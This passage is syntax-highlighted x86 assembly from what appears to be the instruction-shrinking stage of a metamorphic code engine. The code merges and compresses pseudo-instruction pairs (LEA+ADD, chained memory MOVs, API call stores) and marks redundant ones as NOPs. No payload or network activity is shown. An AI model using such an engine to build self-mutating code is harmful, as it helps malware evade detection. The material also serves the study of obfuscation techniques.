                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next11_OPMemImm_8b</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next12</span><span class="sc0">
        </span><span class="sc5">@@Double_Next11_OPRegImm_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc5">@@Double_Next11_CalculateOperation_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_CalculateOperation_2</span><span class="sc0">
        </span><span class="sc5">@@Double_Next11_OPMemImm_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next11_CalculateOperation_8b</span><span class="sc0">

      </span><span class="sc5">@@Double_Next12</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">     </span><span class="sc1">; LEA?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; LEA + ADD Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next12_MergeLEAADDReg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; LEA + ADD Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0">
        </span><span class="sc5">@@Double_Next12_MergeLEAADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check if destiny in LEA is the same</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; as destiny in ADD</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If so, add the Imm of the ADD to the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; dword addition in the LEA and set</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0"> </span><span class="sc1">; NOP at first instruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next12_MergeLEAADDReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check if destinies are the same</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Look for a free space to insert the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next12_SetFirstReg</span><span class="sc0"> </span><span class="sc1">; register addition in the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; LEA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next12_SetSecondReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If the register is already inserted,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;  set a *2 in the multiplicator</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next12_AddScalar</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; If multiplicator is already *2 or</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Double_Next13</span><span class="sc0"> </span><span class="sc1">;  greater, don't shrink</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Exchange registers, to set the one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  repeated in the second slot of the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">;  indexes.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Set *2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0"> </span><span class="sc1">; Eliminate first instruction</span><span class="sc0">
        </span><span class="sc5">@@Double_Next12_AddScalar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set *2 to the second index</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next12_SetFirstReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set a new index register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next12_SetSecondReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set a new second index register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0">

      </span><span class="sc5">@@Double_Next13</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">     </span><span class="sc1">; MOV Mem,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">     </span><span class="sc1">; MOV Mem,Mem2 + MOV Mem2,Mem3?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_MergeMOVs</span><span class="sc0"> </span><span class="sc1">; Then, merge them</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_NotOPRegMem</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_OPRegMem_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; MOV Mem,Mem2 + OP Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_OPRegMem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next13_NotOPRegMem2</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_NotOPRegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; Same with 8 bits?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_NotOPRegMem2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Double_Next13_OPRegMem_2</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_NotOPRegMem2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">; Merge MOVs</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_MOVMemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">    </span><span class="sc1">; APICALL_STORE = MOV Mem,EAX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_MOVMemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">     </span><span class="sc1">; MOV Mem,Mem2 + MOV Mem2,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_MOVMemImm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">    </span><span class="sc1">; MOV Mem,Mem2 + CALL Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next13_CALLMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">    </span><span class="sc1">; MOV Mem,Mem2 + JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_JMPMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_CALLMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_OPRegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Merge Mem operands</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOPAt1st</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_MergeMOVs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; MOV Mem,Mem2 + MOV Mem2,Mem3 =</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; = MOV Mem,Mem3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetNOP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_MOVMemReg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@Double_Next13_MOVMemImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; MOV Mem,Mem2 + MOV Mem2,Reg/Imm =</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; = MOV Mem,Reg/Imm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next_SetNOPAt1st</span><span class="sc0">

      </span><span class="sc5">@@Double_Next14</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">     </span><span class="sc1">; Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_Next15</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
